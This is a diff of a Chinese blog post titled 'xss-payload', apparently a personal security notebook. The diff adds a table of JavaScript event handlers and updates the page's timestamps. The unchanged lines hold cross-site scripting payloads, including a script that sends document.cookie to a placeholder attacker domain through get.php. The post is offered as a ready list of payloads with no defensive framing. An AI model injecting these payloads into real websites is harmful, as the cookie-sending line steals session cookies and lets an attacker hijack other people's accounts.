@@ -62,7 +62,7 @@
 <meta property="og:site_name" content="Alairs Notepad">
 <meta property="og:description" content="常用的payload：">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-24T07:57:02.088Z">
+<meta property="og:updated_time" content="2019-08-24T08:31:17.737Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss-payload">
 <meta name="twitter:description" content="常用的payload：">
@@ -266,7 +266,7 @@
                 
               
 
-              <time title="创建时间：2019-08-24 15:49:10 / 修改时间：15:57:02" itemprop="dateCreated datePublished" datetime="2019-08-24T15:49:10+08:00">2019-08-24</time>
+              <time title="创建时间：2019-08-24 15:49:10 / 修改时间：16:31:17" itemprop="dateCreated datePublished" datetime="2019-08-24T15:49:10+08:00">2019-08-24</time>
             </span>
           
             
@@ -302,6 +302,98 @@
 
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"xss"</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;svg/</span>onload=<span class="string">"alert("</span>xss<span class="string">")"</span>&gt;</span><br></pre></td></tr></table></figure>
 
+<h3 id="JavaScript事件："><a href="#JavaScript事件：" class="headerlink" title="JavaScript事件："></a>JavaScript事件：</h3><table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>当以下情况发生时，出现此事件</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>onabort</td>
+<td>图像加载被中断</td>
+</tr>
+<tr>
+<td>onblur</td>
+<td>元素失去焦点</td>
+</tr>
+<tr>
+<td>onchange</td>
+<td>用户改变域的内容</td>
+</tr>
+<tr>
+<td>onclick</td>
+<td>鼠标单击某个对象</td>
+</tr>
+<tr>
+<td>ondblclick</td>
+<td>鼠标双击某个对象</td>
+</tr>
+<tr>
+<td>onerror</td>
+<td>当加载文档或图像是发生某个错误</td>
+</tr>
+<tr>
+<td>onfocus</td>
+<td>元素获得焦点</td>
+</tr>
+<tr>
+<td>onkeydown</td>
+<td>某个键盘的按键被按下</td>
+</tr>
+<tr>
+<td>onkeypress</td>
+<td>某个键盘的键被按下或按住</td>
+</tr>
+<tr>
+<td>onkeyup</td>
+<td>某个键盘的按键被松开</td>
+</tr>
+<tr>
+<td>onload</td>
+<td>某个页面或图像被完成加载</td>
+</tr>
+<tr>
+<td>onmousedown</td>
+<td>某个鼠标按键被按下</td>
+</tr>
+<tr>
+<td>onmouseout</td>
+<td>鼠标从某元素移开</td>
+</tr>
+<tr>
+<td>onmousemove</td>
+<td>鼠标被移动</td>
+</tr>
+<tr>
+<td>onmouseover</td>
+<td>鼠标被移到某元素之上</td>
+</tr>
+<tr>
+<td>onmouseup</td>
+<td>某个鼠标按键被松开</td>
+</tr>
+<tr>
+<td>onreset</td>
+<td>重置按钮被点击</td>
+</tr>
+<tr>
+<td>onresize</td>
+<td>窗口或框架被调整尺寸</td>
+</tr>
+<tr>
+<td>onselect</td>
+<td>文本被选定</td>
+</tr>
+<tr>
+<td>onsubmit</td>
+<td>提交按钮被点击</td>
+</tr>
+<tr>
+<td>onunload</td>
+<td>用户退出页面</td>
+</tr>
+</tbody></table>
 <h3 id="cookie的利用"><a href="#cookie的利用" class="headerlink" title="cookie的利用"></a>cookie的利用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;window.open('http:/</span><span class="regexp">/yourdomain.cn/g</span>et.php?cookie=<span class="string">'+document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
 
 
@@ -389,7 +481,7 @@
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
           <div class="post-toc">
-            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用的payload："><span class="nav-number">1.</span> <span class="nav-text">常用的payload：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie的利用"><span class="nav-number">2.</span> <span class="nav-text">cookie的利用</span></a></li></ol></div>
+            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用的payload："><span class="nav-number">1.</span> <span class="nav-text">常用的payload：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JavaScript事件："><span class="nav-number">2.</span> <span class="nav-text">JavaScript事件：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie的利用"><span class="nav-number">3.</span> <span class="nav-text">cookie的利用</span></a></li></ol></div>
           </div>
         
       </div>
